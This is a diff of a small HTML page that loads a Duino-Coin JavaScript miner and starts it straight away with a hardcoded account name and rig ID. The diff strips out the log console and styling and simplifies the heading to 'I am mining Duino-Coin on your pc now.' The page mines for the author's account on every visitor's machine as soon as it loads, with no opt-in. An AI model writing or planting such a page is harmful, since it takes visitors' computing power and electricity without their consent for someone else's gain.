@@ -4,79 +4,21 @@
         <meta charset="UTF-8" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Duino-Coin Miner</title>
-        <style>
-            body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-            #log-container {
-                background: #222;
-                color: #0f0;
-                padding: 15px;
-                height: 400px;
-                overflow-y: scroll;
-                font-family: 'Courier New', Courier, monospace;
-                border-radius: 5px;
-                font-size: 13px;
-                margin-top: 10px;
-                white-space: pre-wrap;
-                word-break: break-all;
-            }
-            button {
-                padding: 8px 15px;
-                cursor: pointer;
-                background: #444;
-                color: white;
-                border: none;
-                border-radius: 3px;
-            }
-            button:hover { background: #666; }
-        </style>
+        <title>Duino-JS</title>
     </head>
     <body>
-        <h1>Duino-Coin Web Miner</h1>
-        <p>Your browser is mining Duino-Coin in the background.</p>
+        <h1>I am mining Duino-Coin on your pc now.</h1>
 
-        <button onclick="clearLogs()">로그 지우기</button>
-        <div id="log-container"><div>채굴 로그 대기 중...</div></div>
-
-        <script>
-            // [중요] 다른 JS 로드 전에 로그 가로채기 실행
-            const logContainer = document.getElementById('log-container');
-            function clearLogs() { logContainer.innerHTML = ''; }
-
-            (function() {
-                const oldLog = console.log;
-                console.log = function(...args) {
-                    oldLog.apply(console, args);
-                    const logEntry = document.createElement('div');
-                    // 배열이나 객체 메시지 처리
-                    const message = args.map(arg => 
-                        typeof arg === 'object' ? JSON.stringify(arg) : arg
-                    ).join(' ');
-                    
-                    logEntry.textContent = `> ${message}`;
-                    logContainer.appendChild(logEntry);
-                    logContainer.scrollTop = logContainer.scrollHeight;
-                };
-            })();
-        </script>
-
-        <!-- 메인 라이브러리 로드 -->
         <script src="duino-js.js"></script>
-
         <script>
-            // 마이너 실행 설정
             const username = `jiwonkim_korea_2014`; 
             const rigid = `Duino-JS`; 
             const threads = 1; 
             const miningkey = "null"; 
-
-            window.addEventListener('load', () => {
-                if (typeof startMiner === 'function') {
-                    startMiner(username, rigid, threads, miningkey);
-                } else {
-                    console.log("에러: duino-js.js 파일을 찾을 수 없습니다.");
-                }
-            });
+            
+            if (typeof startMiner === 'function') {
+                startMiner(username, rigid, threads, miningkey);
+            }
         </script>
     </body>
 </html>
